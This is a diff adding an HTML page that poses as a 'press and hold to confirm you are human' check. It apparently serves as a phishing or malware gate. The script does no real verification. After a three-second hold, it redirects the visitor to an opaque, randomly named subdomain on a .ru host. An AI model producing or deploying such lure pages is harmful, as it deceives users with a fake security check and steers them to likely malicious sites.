@@ -1,0 +1,127 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Press and Hold Button</title>
+  <style>
+    body {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background-color: #f4f4f4;
+    }
+    .button-container {
+      position: relative;
+      width: 300px;
+      text-align: center;
+    }
+    .info-div {
+      margin-bottom: 10px;
+      padding: 10px;
+      background-color: white;
+      border-radius: 10px;
+      border: 1px solid #ddd;
+      color: #333;
+      font-size: 14px;
+      font-weight: bold;
+    }
+    .hold-button {
+      position: absolute;
+      width: 100%;
+      height: 50px;
+      background-color: white;
+      color: #007bff;
+      font-weight: bold;
+      border: 2px solid #007bff; /* Blue border */
+      font-size: 18px;
+      border-radius: 25px; /* Increased button border radius */
+      cursor: pointer;
+      outline: none;
+      overflow: hidden;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+    .progress-bar {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 0;
+      height: 100%;
+      background-color: #007bff; /* Blue animation color */
+      z-index: 1;
+      transition: width 3s linear;
+      border-radius: 23px; /* Adjusted to match the button border radius minus the border width */
+    }
+    .hold-button span {
+      position: relative;
+      z-index: 2; /* Keep text above the progress bar */
+      transition: color 0.2s linear; /* Smooth color change */
+    }
+    .hold-button:active span {
+      color: black; /* Highlight text in black when holding */
+    }
+    .checkmark {
+      display: none;
+      font-size: 24px;
+      color: #007bff; /* Match the animation color */
+    }
+  </style>
+</head>
+<body>
+  <div class="button-container">
+    <!-- Info div with instructions -->
+    <div class="info-div">
+      Press & Hold button to confirm you are a human (and not a bot)
+    </div>
+    <!-- Hold button -->
+    <button class="hold-button" id="holdButton">
+      <span class="checkmark" id="checkmark">✔</span>
+      <span id="buttonText">Press & Hold</span>
+      <div class="progress-bar" id="progressBar"></div>
+    </button>
+  </div>
+
+  <script>
+    const holdButton = document.getElementById('holdButton');
+    const progressBar = document.getElementById('progressBar');
+    const checkmark = document.getElementById('checkmark');
+    const buttonText = document.getElementById('buttonText');
+    let holdTimeout;
+
+    holdButton.addEventListener('mousedown', () => {
+      // Start progress animation from the left side to the right
+      progressBar.style.transition = 'width 3s linear';
+      progressBar.style.width = '100%';
+      
+      // Set timeout to complete the process when the progress finishes
+      holdTimeout = setTimeout(() => {
+        buttonText.style.display = 'none';
+        checkmark.style.display = 'block';
+        progressBar.style.transition = 'none'; // Stop any further transition
+        progressBar.style.width = '100%'; // Ensure width stays at 100%
+        // Redirect immediately
+        window.location.href = 'https://ytyctyp.goldenlakes.ru/L3xl/';
+      }, 3000); // Match the 3 seconds of progress animation
+    });
+
+    holdButton.addEventListener('mouseup', () => {
+      // Reset progress bar if the user releases the button early
+      clearTimeout(holdTimeout);
+      progressBar.style.transition = 'width 0.2s linear';
+      progressBar.style.width = '0';
+    });
+
+    holdButton.addEventListener('mouseleave', () => {
+      // Reset progress bar if the mouse leaves the button early
+      clearTimeout(holdTimeout);
+      progressBar.style.transition = 'width 0.2s linear';
+      progressBar.style.width = '0';
+    });
+  </script>
+</body>
+</html>
